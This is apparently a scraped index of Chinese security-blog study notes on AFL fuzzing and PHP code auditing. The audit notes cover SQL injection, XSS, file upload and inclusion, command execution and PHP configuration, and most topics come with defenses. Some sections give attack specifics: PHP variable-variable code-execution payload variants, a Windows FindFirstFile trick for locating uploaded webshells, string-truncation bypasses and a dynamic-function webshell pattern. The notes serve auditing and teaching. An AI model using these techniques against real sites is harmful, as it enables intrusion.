","date":"2021-12-13","objectID":"/2021-12-13-%E7%81%B0%E5%B8%BD%E9%BB%91%E5%AE%A2%E7%AC%AC%E4%BA%94%E7%89%88%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%B8%8B%E4%B8%80%E4%BB%A3%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95/:4:0","tags":["安全前沿"],"title":"灰帽黑客（第五版）学习笔记–下一代模糊测试","uri":"/2021-12-13-%E7%81%B0%E5%B8%BD%E9%BB%91%E5%AE%A2%E7%AC%AC%E4%BA%94%E7%89%88%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%B8%8B%E4%B8%80%E4%BB%A3%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95/"},{"categories":["安全技术","学习"],"content":"0x04 AFL AFL将Fuzz提升到一个新水平，使用遗传算法达到最佳的代码覆盖范围。 工作流程如下： 参考资料： https://www.freebuf.com/articles/system/191543.html https://bbs.pediy.com/thread-249912.htm ","date":"2021-12-13","objectID":"/2021-12-13-%E7%81%B0%E5%B8%BD%E9%BB%91%E5%AE%A2%E7%AC%AC%E4%BA%94%E7%89%88%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%B8%8B%E4%B8%80%E4%BB%A3%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95/:5:0","tags":["安全前沿"],"title":"灰帽黑客（第五版）学习笔记–下一代模糊测试","uri":"/2021-12-13-%E7%81%B0%E5%B8%BD%E9%BB%91%E5%AE%A2%E7%AC%AC%E4%BA%94%E7%89%88%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%B8%8B%E4%B8%80%E4%BB%A3%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95/"},{"categories":["安全技术","学习"],"content":"\r","date":"2021-12-05","objectID":"/2021-12-05-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%8B/:0:0","tags":["代码审计","Web安全"],"title":"代码审计学习笔记（下）","uri":"/2021-12-05-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%8B/"},{"categories":["安全技术","学习"],"content":"0x00 二次漏洞审计 什么是二次漏洞？ 需要先构造好利用代码写入网站保存，在第二次或多次请求后调用攻击代码触发或者修改配置触发的漏洞。 审计技巧 依然可以通过关键词定位，但精度不够，比如可以根据数据库字段、数据表名等去代码中搜索。二次漏洞的逻辑性强，通读有助于挖洞。业务越复杂越容易存在二次漏洞，可以重点关注购物车、订单、引用数据、文章编辑、草稿等。SQL注入和XSS较为常见。 ","date":"2021-12-05","objectID":"/2021-12-05-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%8B/:1:0","tags":["代码审计","Web安全"],"title":"代码审计学习笔记（下）","uri":"/2021-12-05-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%8B/"},{"categories":["安全技术","学习"],"content":"0x01 代码审计小技巧 1.钻GPC等转义的空子 不受GPC保护的$_SERVER变量。在PHP5之后用$_SERVER取到的header字段不受GPC影响，$_FILES变量也不受GPC保护。 编码转换问题。如宽字节注入。 2.神奇的字符串 字符处理函数报错信息泄露 页面的报错信息通常能泄露文件绝对路径、代码、变量以及函数等信息。error_reporting函数中有几个选项来配置显示错误的等级，列表如下： E_WARNING #常用，代表显示错误信息\rE_PARSE\rE_NOTICE #常用，代表显示基础提示信息\rE_CORE_ERROR\rE_CORE_WARNING\rE_COMPILE_ERROR\rE_COMPILE_WARNING\rE_USER_ERROR\rE_USER_WARNING\rE_USER_NOTICE\rE_STRICT\rE_RECOVERABLE_ERROR\rE_ALL #常用，代表显示所有问题\r大多数错误提示都会显示文件路径。大多数程序会使用trim函数对用户名等值去掉两边的空格，这时候如果我们传入的用户名参数时一个数组，程序就会报错。 字符串截断 %00截断。需要GPC关闭以及不被addslashes函数过滤，PHP5.3后全面修复。 iconv函数字符编码转换截断。iconv用于字符编码转换，如UTF-8到GBK。而字符集的编码转换存在一定的差异性，编码时不能成功转换，iconv遇到无法处理的字符串时会停止处理后续字符串。作者fuzz测试UTF-8到GBK的转码，发现chr(128)-chr(255)之间都可以截断字符串。 3.php://输入输出流 使用最多的封装器是php://input，php://output，php://filter。 php://input可以访问请求原始数据的只读流，即可以直接读取到POST上没有经过解析的原始数据，而无法获取“multipart/from-data”方式提交的数据。 php://output是一个只写的数据流，将刘书记输出。 php://filter是一个文件操作协议，可以对磁盘中的文件进行读写操作，效果类似readfile等。 4.PHP代码解析标签 PHP存在多种解析标签，最标准的是\u003c?php?\u003e，除此之外，还有： 脚本标签。\u003cscript language=\"php\"\u003e....\u003cscript\u003e 短标签。\u003c?...?\u003e，使用短标签前需要在php.ini中设置short_open_tag=on，默认开启。 asp标签。\u003c%...%\u003e，在PHP3.0.4版后可用，需要在php.ini中设置asp_tags=on，默认关闭。 5.fuzz漏洞发现 6.不严谨的正则表达式 没有使用^和$限定匹配开始位置。 特殊字符未转义。 7.十余种MYSQL报错注入 可参考http://81.70.81.64/%e5%ae%89%e5%85%a8%e7%89%9bsql%e6%b3%a8%e5%85%a5%e5%ad%a6%e4%b9%a0%e7%ac%94%e8%ae%b0/#0x02-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5 8.Windows FindFirstFile利用 目前大多数程序都会对上传的文件名加入时间戳等字符再进行MD5，然后下载文件的时候通过保存在数据库里的文件ID读取文件路径，一样也实现了文件下载，这样我们就无法直接得到我们上传的webshell文件路径，但是当在Windows下时，我们只需要知道文件所在目录，然后利用Windows的特性就可以访问到文件，这是因为Windows在搜索文件的时候使用了FindFirstFile这一个winapi函数，该函数到一个文件夹(包含子文件夹)去搜索指定文件。 利用方法很简单，我们只要将文件名不可知部分之后的字符用\"\u003c“或者”\u003e“代替即可，不过要注意一点是，只使用一个”\u003c“或者”\u003e“则只能代表一个字符，如果文件名是12345或者更长，这时候请求\"1\u003c“或者\"1\u003e“都是访问不到文件的，需要\"1«“才能访问到，代表继续往下搜索，有点像Windows的短文件名，这样我们还可以通过这个方式来爆破目录文件了。 目前所有PHP版本都可用，PHP并没有在语言层面禁止使用\u003e、\u003c这些特殊字符，这一特性存在很多函数之中。 9.PHP可变变量 PHP可变变量指的是一个变量的变量名可用动态地设置和利用。在PHP中，单引号代表纯字符串，而双引号则是会解析中间的变量，所以当使用双引号时会存在代码执行漏洞。 实例代码：\u003c?php $a=\"${@phpinfo()}\";?\u003e “@”符号必须存在，不然无法执行，其他写法： 花括号内第一个字符为空格\r$a=\"${ phpinfo()}\";\r花括号内第一个字符为TAB\r$a=\"${ phpinfo()}\";\r花括号内第一个字符为注释符\r$a=\"${/**/phpinfo()}\";\r花括号内第一个字符为回车换行符\r$a=\"${\rphpinfo()}\";\r花括号内第一个字符为加号\r$a=\"${+phpinfo()}\";\r花括号内第一个字符为减号\r$a=\"${-phpinfo()}\";\r花括号内第一个字符为感叹号\r$a=\"${!phpinfo()}\";\r除此之外还有~、\\等\r","date":"2021-12-05","objectID":"/2021-12-05-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%8B/:2:0","tags":["代码审计","Web安全"],"title":"代码审计学习笔记（下）","uri":"/2021-12-05-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%8B/"},{"categories":["安全技术","学习"],"content":"0x02 参数的安全过滤 第三方过滤函数与类 内置过滤函数 SQL注入过滤函数。addslashes、mysql_escape_string、mysql_real_escape_string，它们的作用都是通过添加反斜杠来转义字符，前两种直接在敏感字符串前加，可能存在宽字节注入绕过的问题，最后一种会考虑当前连接数据库的字符集编码，安全性更好。 XSS过滤函数。htmlspeacialchars将字符串中的特殊字符转换成HTML实体编码，strip_tags用来去掉HTML及PHP标记。 命令执行过滤函数。escapeshellcmd在Windows下过滤方式则是在特殊字符前面加了^，Linux下加\\。escapeshellarg则是给所有参数加上一对双引号，强制转换为字符串。 ","date":"2021-12-05","objectID":"/2021-12-05-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%8B/:3:0","tags":["代码审计","Web安全"],"title":"代码审计学习笔记（下）","uri":"/2021-12-05-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%8B/"},{"categories":["安全技术","学习"],"content":"0x03 使用安全的加密算法 MD5是目前使用最多的密码存储加密算法。 ","date":"2021-12-05","objectID":"/2021-12-05-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%8B/:4:0","tags":["代码审计","Web安全"],"title":"代码审计学习笔记（下）","uri":"/2021-12-05-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%8B/"},{"categories":["安全技术","学习"],"content":"0x04 业务功能安全设计 验证码 不刷新直接绕过 暴力破解 机器识别。非实时生成的验证码，把全部验证码文件报错，构建图片MD5库，利用时直接匹配服务器端返回的图片MD5即可。动态生成的验证码需要进行图片文字识别或者语言识别。 打码平台，如打码兔。 验证码资源滥用，如短信轰炸。 用户登录 撞库漏洞。 API登录。 用户注册 安全设计思路 设计验证码 采集用户机器唯一识别码，拦截短时间内多次注册。 根据账号格式自学习识别垃圾账号。 防止SQL注入漏洞与XSS漏洞 文件管理 禁止写入脚本可在服务端执行的文件 限制文件管理功能操作的目录 限制文件管理功能访问权限 禁止上传特殊字符文件名的文件 ","date":"2021-12-05","objectID":"/2021-12-05-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%8B/:5:0","tags":["代码审计","Web安全"],"title":"代码审计学习笔记（下）","uri":"/2021-12-05-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%8B/"},{"categories":["安全技术","学习"],"content":"0x05 应用安全体系 用户密码安全策略 前后台用户分表 后台地址隐藏 密码加密存储方式 登录限制 API站库分离 慎用第三方服务 严格的权限控制 敏感操作多因素验证 应用自身的安全中心 高级PHP应用程序漏洞审核技术 ","date":"2021-12-05","objectID":"/2021-12-05-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%8B/:6:0","tags":["代码审计","Web安全"],"title":"代码审计学习笔记（下）","uri":"/2021-12-05-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%8B/"},{"categories":["安全技术","学习"],"content":"\r","date":"2021-12-04","objectID":"/2021-12-04-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%AD/:0:0","tags":["代码审计","Web安全"],"title":"代码审计学习笔记（中）","uri":"/2021-12-04-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%AD/"},{"categories":["安全技术","学习"],"content":"0x00 SQL注入漏洞 普通注入 最容易利用的SQL注入漏洞，比如直接通过注入union查询，分int型和string型，后者需要使用单或双引号闭合。 搜索关键字：select from，mysql_connect，mysql_query，mysql_fectch_row，update，insert，delete等。 编码注入 最常见的编码注入是MySQL宽字节已经urldecode/rawurldecode函数导致的。 解决宽字节注入的方法（前2种更推荐）： 在执行查询之前先执行SET NAME ‘gbk’，设置character_set_client=binary。 使用pdo方式，在PHP5.3.6及一下版本需要设置setAttribute(PDO::ATTR_EMULATE_PREPARES,false);来禁用prepared statements的仿真效果。 使用mysql_set_charset(‘gbk’)设置编码，然后使用mysql_real_escape_string()函数被参数过滤。 挖掘宽字节注入的方法：搜索关键字，SET NAMES，character_set_client=gbk，mysql_set_charset('gbk') 挖掘二次urldecode注入的方法：搜索关键字，urldecode，rawurldecode 漏洞防范 通常数据污染有两种方式，一种是被动接收参数，类似于GET、POST等；还有一种是主动获取参数，类似于读取远程页面或者文件内容等。 gpc/runtime魔术引号。它们只对单引号、双引号、反斜杠及空字符NULL进行过滤，对int型的注入没有多大作用。 过滤类和函数。两种应用场景，程序入口统一过滤和SQL语句运行前过滤。addslashes函数的过滤范围与GPC一致。mysql_[real_]escape_string函数对【\\x00】【\\n】【\\r】【\\】【’】【\"】【\\x1a】进行过滤，但real接受的是一个连接句柄并根据当前字符集转义字符串（推荐使用）。intval等字符转换，将变量转化成int类型。 PDO prepare 预编译。通过预编译的方式来处理数据库查询。 ","date":"2021-12-04","objectID":"/2021-12-04-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%AD/:1:0","tags":["代码审计","Web安全"],"title":"代码审计学习笔记（中）","uri":"/2021-12-04-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%AD/"},{"categories":["安全技术","学习"],"content":"0x01 XSS漏洞 挖掘XSS漏洞的关键在于寻找没有被过滤的参数，且这些参数传入到输出函数，常用的出处函数列表如下：print、print_r、echo、printf、sprintf、die、var_dump、var_export。 漏洞防范 特殊字符HTML实体转码，列表如下：’、\"、\u003c\u003e、\\、:、\u0026、#。 标签事件属性黑白名单。 ","date":"2021-12-04","objectID":"/2021-12-04-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%AD/:2:0","tags":["代码审计","Web安全"],"title":"代码审计学习笔记（中）","uri":"/2021-12-04-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%AD/"},{"categories":["安全技术","学习"],"content":"0x02 CSRF漏洞 漏洞存在有权限控制的地方。白盒审计时注意核心文件或功能点里是否存在验证token和referer相关的代码。 漏洞防范 防御CSRF漏洞的最主要问题是解决可信的问题。 增加token/referer验证避免img标签请求的水坑攻击。 增加验证码。用于敏感操作的页面。 ","date":"2021-12-04","objectID":"/2021-12-04-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%AD/:3:0","tags":["代码审计","Web安全"],"title":"代码审计学习笔记（中）","uri":"/2021-12-04-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%AD/"},{"categories":["安全技术","学习"],"content":"0x03 文件操作漏洞 文件操作包括文件包含、文件读取、文件删除、文件修改以及文件上传。 文件包含漏洞 文件包含又分为本地文件包含和远程文件包含。这种漏洞大多出现在模块加载、模板加载以及cache调用的地方，比如传入的模块名参数。挖掘是可以先跟踪程序的运行流程，观察模块加载时包含的文件是否可控，另外就是直接搜索include、require、include _once、require_once这四个函数来晦朔观察是否存在可控变量。 文件读取（下载）漏洞 挖掘经验：一种是先黑盒看看个功能点对应的文件，再去读文件。另一种方式是去搜索file_get_contents、highlight_file、fopen、readfile、fread、fgetss、fgets、parse_ini_file、show_source、file函数。 文件上传漏洞 挖掘经验：最快的方法是搜索move_uploaded_file函数，再去看调用这个函数上传文件的代码存不存在未限制上传格式或者可以绕过，其中问题较多的是黑名单限制文件格式已经未更改文件名的方式，没有更改文件名的情况下，在Apache利用其向前寻找解析格式和IIS的分号解析bug都可以执行代码。 文件删除漏洞 挖掘经验：黑盒下测试能否删除某个文件，如果删除不了，再去从执行流程去追提交的文件名参数的传递过程。白盒下搜索有变量参数的unlink、session_destory。 通用文件操作防御 文件操作漏洞利用的共同点： 由越权引起可以操作未授权操作的文件 要操作更多文件需要跳转目录 大多都是直接在请求中传入文件名 防御手段： 合理的权限管理 尽量避免直接传入文件名 避免目录跳转 文件上传漏洞的防范 文件上传漏洞利用的方式有两种：文件类型验证不严谨和写入文件不规范。 作者给出了两种防范方案： 白名单方式过滤文件拓展名，使用in_array或者三等于符号来对比拓展名。 保存上传的文件时重命名文件，文件名命名规则采用时间戳的拼接随机数的MD5值，md5(time()+rand(1,10000))。 ","date":"2021-12-04","objectID":"/2021-12-04-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%AD/:4:0","tags":["代码审计","Web安全"],"title":"代码审计学习笔记（中）","uri":"/2021-12-04-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%AD/"},{"categories":["安全技术","学习"],"content":"0x04 代码执行漏洞 挖掘经验：载入缓存或者模板以及对变量处理不严格导致PHP语句通过eval或assert执行。preg_replace在对字符串处理时，如URL、HTML标签已经文章内容等过滤功能，可能存在漏洞。复杂程序中可能存在call_user_func和call_user_func_array动态调用的代码执行。还有一类非常常见的动态函数的代码执行，如：$_GET($_POST[“xx”])，基于此的各种变形常被作为Web后门。 可能存在过滤不严的调用函数：call_user_func、call_user_func_array、array_map、usort、uasort、uksort、array_filter、array_reduce、array_diff_uassoc、array_diff_ukey、array_udiff、array_udiff_assoc、array_udiff_uassoc、array_uintersect、array_uintersect_uassoc、array_walk、array_walk_recursive、xml_set_character_data_handler、xml_set_default_handler、xml_set_element_handler、xml_set_end_namespace_decl_handler、xml_set_external_entity_ref_handler、xml_set_notation_decl_handler、xml_set_processing_instruction_handler、xml_set_start_namespace_decl_handler、xml_set_unparsed_entity_decl_handler、stream_filter_register、set_error_handler、register_shutdown_function、register_tick_function。 漏洞防范 采用参数白名单过滤，结合正则表达式进行限制。 ","date":"2021-12-04","objectID":"/2021-12-04-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%AD/:5:0","tags":["代码审计","Web安全"],"title":"代码审计学习笔记（中）","uri":"/2021-12-04-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%AD/"},{"categories":["安全技术","学习"],"content":"0x05 命令执行漏洞 挖掘经验：直接搜索system、exec、shell_exec、passthru、pcntl_exec、popen、proc_open函数名。 漏洞防范 命令防注入函数：escapeshellcmd过滤整条命令，escapeshellarg过滤参数。 参数白名单。 ","date":"2021-12-04","objectID":"/2021-12-04-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%AD/:6:0","tags":["代码审计","Web安全"],"title":"代码审计学习笔记（中）","uri":"/2021-12-04-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%AD/"},{"categories":["安全技术","学习"],"content":"0x06 变量覆盖漏洞 挖掘经验：由函数导致的变量覆盖比较容易发现，只要搜下参数带有变量的extract、parse_str，然后回溯变量是否可控。import_request_variable函数则相当于开启了全局变量的注册，寻找未被初始化且操作前没有赋值的变量作为参数提交即可，另外写在此函数之前的所有变量都可覆盖。双$$符号注册变量会导致变量覆盖，也可以通过搜索来挖掘。 漏洞防范 使用原始变量。不进行变量注册，直接使用原生的$_GET、$_POST等数组变量进行操作，如果需要注册个别变量，可直接在代码中定义，然后再把请求中的值赋值给它。 验证变量存在。加入注册变量前对变量是否存在的判断。 ","date":"2021-12-04","objectID":"/2021-12-04-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%AD/:7:0","tags":["代码审计","Web安全"],"title":"代码审计学习笔记（中）","uri":"/2021-12-04-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%AD/"},{"categories":["安全技术","学习"],"content":"0x07 逻辑处理漏洞 挖掘经验：通读功能点源码，熟悉业务流程，关注程序是否可重复安装、修改密码处是否可越权修改其他用户密码、找回密码验证码是否可被暴力破解以及修改其他用户密码、Cookie验证是否可绕过。 等于与存在判断绕过 in_array，用于判断一个值是否在某一个数组列表里面，但是它比较前会做类型转换，可能将字符串转换为整型，绕过检查。 is_numeric，用于判断一个变量是否为数字，当传入的参数时hex时直接通过并返回true，而MYSQL是可以直接使用hex编码代替字符串明文的，虽然不能直接 注入SQL语句，但存在二次注入和XSS等漏洞隐患。 双等于和三等于。双等于会在判断前对变量进行类型转换，而三等于则不会。 账户体系中的越权漏洞 未exit或return引发的安全问题 某些情况下，经过条件判断后忘记写return、die、exit等退出行为，导致程序继续执行。 常见支付漏洞 客户端修改单价、总价、数量，服务端未严格校验。 重复发包来利用时间差，以少量的钱多次购买。 漏洞防范 深入熟悉业务逻辑 注意多熟悉函数的功能和差异 ","date":"2021-12-04","objectID":"/2021-12-04-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%AD/:8:0","tags":["代码审计","Web安全"],"title":"代码审计学习笔记（中）","uri":"/2021-12-04-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%AD/"},{"categories":["安全技术","学习"],"content":"0x08 会话认证漏洞 挖掘经验：观察程序的登录功能代码，寻找是否存在业务逻辑能够控制session值或者直接让密码验证的漏洞。另外需要关注程序验证是否为登录的代码，即是否直接验证cookie值是否为空，还是通过cookie值来作为当前用户。 漏洞防范 严格现在输入的异常字符以及避免使用客户端提交上来的内容去直接进行操作，应该把cookie同session结合使用，避免将敏感信息存入cookie。 ","date":"2021-12-04","objectID":"/2021-12-04-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%AD/:9:0","tags":["代码审计","Web安全"],"title":"代码审计学习笔记（中）","uri":"/2021-12-04-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%AD/"},{"categories":["安全技术","学习"],"content":"\r","date":"2021-12-03","objectID":"/2021-12-03-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%8A/:0:0","tags":["代码审计","Web安全"],"title":"代码审计学习笔记（上）","uri":"/2021-12-03-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%8A/"},{"categories":["安全技术","学习"],"content":"0x00 前言 学习《代码审计 企业级Web代码安全架构》一书所做的笔记。 ","date":"2021-12-03","objectID":"/2021-12-03-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%8A/:1:0","tags":["代码审计","Web安全"],"title":"代码审计学习笔记（上）","uri":"/2021-12-03-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%8A/"},{"categories":["安全技术","学习"],"content":"0x01 PHP核心配置详解 官方配置说明 PHP_INI_ 常量的定义* 常量 含义 PHP_INI_USER 可在用户PHP脚本或 Windows 注册表以及 .user.ini 中设定 PHP_INI_PERDIR 可在 php.ini，.htaccess 或 httpd.conf 中设定 PHP_INI_SYSTEM 可在 php.ini 或 httpd.conf 中设定 PHP_INI_ALL 可在任何地方设定 php.ini only 可仅在php.ini中设置 ","date":"2021-12-03","objectID":"/2021-12-03-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%8A/:2:0","tags":["代码审计","Web安全"],"title":"代码审计学习笔记（上）","uri":"/2021-12-03-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%8A/"},{"categories":["安全技术","学习"],"content":"0x02 会影响PHP脚本安全的配置列表以及核心配置选项 1.register_globals（全局变量注册开关） 该选项在设置为on的情况下，会直接把用户GET、POST等方式提交上来的参数注册成全局变量并初始化值为参数对应的值，使得提交参数可以直接在脚本中使用。register_globals在PHP版本小于等于4.2.3时设置为PHP_INI_ALL，从PHP 5.3.0起被废弃，不推荐使用，在PHP 5.4.0中移除了该选项。 2.allow_url_include（是否运行包含远程文件） 在该配置为on的情况下，它可以直接包含远程文件，当存在include（$var）且$var可控的情况下，可以直接控制$var变量来执行PHP代码。allow_url_include在PHP 5.2.0后默认设置为off，配置范围是PHP_INI_ALL。与之类似的配置有allow_url_fopen，配置是否允许打开远程文件。 3.magic_quotes_gpc（魔术引号自动过滤） magic_quotes_gpc只要被开启，在不存在编码或者其他特殊绕过的情况下，可以使得很多漏洞无法被利用。当该选项设置为on时，会自动在GET、POST、COOKIE变量中的单引号（’）、双引号（\"）、反斜杠（\\）及空字符（NULL）的前面加上反斜杠（\\），但是在PHP 5中magic_quotes_gpc并不会过滤$_SERVER变量，导致很多类似client-ip、referer一类的漏洞能够利用。在PHP 5.3之后的不推荐使用magic_quotes_gpc，PHP 5.4之后干脆被取消。 4.magic_quotes_runtime_（魔术引号自动过滤）_ 它跟magic_quotes_gpc的区别是，处理的对象不一样，magic_quotes_runtime只对从数据库或者文件中获取的数据进行过滤。同样，magic_quotes_runtime在PHP 5.4之后也被取消，配置范围是PHP_INI_ALL。 有部分函数受它的影响，所以在某些情况下这个配置是可以绕过的，受影响的列表如下： get_meta_tags（）、file_get_contents（）、file（）、fgets（）、fwrite（）、fread（）、fputcsv（）、stream_socket_recvfrom（）、exec（）、system（）、passthru（）、stream_get_contents（）、bzread（）、gzfile（）、gzgets（）、gzwrite（）、gzread（）、exif_read_data（）、dba_insert（）、dba_replace（）、dba_fetch（）、ibase_fetch_row（）、ibase_fetch_assoc（）、ibase_fetch_object（）、mssql_fetch_row（）、mssql_fetch_object（）、mssql_fetch_array（）、mssql_fetch_assoc（）、mysqli_fetch_row（）、mysqli_fetch_array（）、mysqli_fetch_assoc（）、mysqli_fetch_object（）、pg_fetch_row（）、pg_fetch_assoc（）、pg_fetch_array（）、pg_fetch_object（）、pg_fetch_all（）、pg_select（）、sybase_fetch_object（）、sybase_fetch_array（）、sybase_fetch_assoc（）、SplFileObject：fgets（）、SplFileObject：fgetcsv（）、SplFileObject：fwrite（）` 5.magic_quotes_sybase_（魔术引号自动过滤）_ 设置为on时，它会覆盖掉magic_quotes_gpc=on的配置。而它们之前的区别在于处理方式不同，magic_quotes_sybase仅仅是转义了空字符和把单引号（’）变成了双引号（’’）。PHP 5.4 后移除。 6.safe_mode（安全模式） 这个配置会出现下面限制： 所有文件操作函数（例如unlink（）、file（）和include（））等都会受到限制。 通过函数popen（）、system（）以及exec（）等函数执行命令或程序会提示错误。 下面是启用safe_mode指令时受影响的函数、变量及配置指令的完整列表： apache_request_headers（）、ackticks（）、hdir（）、hgrp（）、chmode（）、chown（）、copy（）、dbase_open（）、dbmopen（）、dl（）、exec（）、filepro（）、filepro_retrieve（）、ilepro_rowcount（）、fopen（）、header（）、highlight_file（）、ifx_*、ingres_*、link（）、mail（）、max_execution_time（）、mkdir（）、move_uploaded_file（）、mysql_*、parse_ini_file（）、passthru（）、pg_lo_import（）、popen（）、posix_mkfifo（）、putenv（）、rename（）、zmdir（）、set_time_limit（）、shell_exec（）、show_source（）、symlink（）、system（）、touch（） 7_.open_basedir PHP可访问目录_ open_basedir指令用来限制PHP只能访问哪些目录，通常我们只需要设置Web文件目录即可，如果需要加载外部脚本，也需要把脚本所在目录路径加入到open_basedir指令中，多个目录以分号（；）分割。 使用open_basedir需要注意的一点是，指定的限制实际上是前缀，而不是目录名。例如，如果配置open_basedir=/www/a，那么目录/www/a和/www/ab都是可以访问的。所以如果要将访问仅限制在指定的目录内，请用斜线结束路径名。例如设置成：open_basedir=/www/a/。 当open_basedir配置目录后，执行脚本访问其他文件都需要验证文件路径，因此在执行效率上面也会有一定的影响。该指令的配置范围在PHP版本小于5.2.3时是PHP_INI_SYSTEM，在PHP版本大于等于5.2.3是PHP_INI_ALL。 8.disable_functions（禁用函数） 使用disable_functions指令来禁止一些敏感函数的使用。同时把dl（）函数也加到禁止列表，因为攻击者可以利用dl（）函数来加载自定义的PHP扩展以突破disable_functions指令的限制。 9.display_errors和error_reporting错误显示 display_errors表明是否显示PHP脚本内部错误的选项，在生产环境中设置display_errors=on会带来一些安全隐患。error_reporting选项用来配置错误显示的级别，可使用数字也可使用内置常量配置。 